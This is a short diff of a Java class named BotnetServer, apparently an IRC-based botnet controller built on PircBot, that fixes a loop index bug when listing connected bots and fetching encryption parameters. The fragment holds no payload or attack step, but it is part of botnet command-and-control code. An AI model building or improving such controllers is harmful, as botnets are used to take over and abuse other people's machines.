@@ -142,7 +142,7 @@ public class BotnetServer extends PircBot {
 	
 	protected void onUserList(String channel, User[] bots) {
 		for (int i = 0; i < bots.length; i++) {
-			if (!bots[1].getNick().equals(NAME)) {
+			if (!bots[i].getNick().equals(NAME)) {
 				System.out.println("\t" + bots[i].toString());
 				//TODO: fill in stuff with key stuff
 				PubInfo info = MsgEncrypt.getPubParams();
